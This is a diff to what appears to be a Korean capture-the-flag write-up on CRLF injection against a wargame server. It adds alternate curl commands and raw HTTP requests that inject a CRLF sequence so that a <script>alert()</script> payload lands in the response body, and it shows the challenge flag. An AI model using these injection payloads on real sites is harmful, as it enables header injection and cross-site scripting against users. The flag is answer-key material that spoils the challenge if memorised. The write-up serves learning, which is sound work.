@@ -474,6 +474,14 @@ curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A<script>aler
 
 |
 
+```bash
+curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A&value=<script>alert()</script>"
+```
+
+보기 흉하면 value에 본문을 넣어도 됨
+
+|
+
 |
 
 |
@@ -608,7 +616,6 @@ K0{CRLF_is_very_common_vulnerability}
 POST /report HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 57
 
 header=
 
@@ -617,6 +624,20 @@ header=
 ```
 
 코드 다이어트
+
+|
+
+```bash
+POST / HTTP/1.1
+Host: war.knock-on.org:10013
+Content-Type: application/x-www-form-urlencoded
+
+header=
+
+&value=<script>alert()</script>
+```
+
+어차피 `\r\n\r\n` 뒤는 본문으로 인식하기 때문에 `value`의 값으로 본문을 넣어도 됨
 
 |
 
@@ -632,6 +653,12 @@ header=
 
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A<script>alert()</script>&value"
+```
+
+또는
+
+```bash
+curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A&value=<script>alert()</script>"
 ```
 
 |
@@ -650,6 +677,18 @@ header=
 
 <script>alert()</script>
 &value
+```
+
+또는
+
+```bash
+POST / HTTP/1.1
+Host: war.knock-on.org:10013
+Content-Type: application/x-www-form-urlencoded
+
+header=
+
+&value=<script>alert()</script>
 ```
 
 |
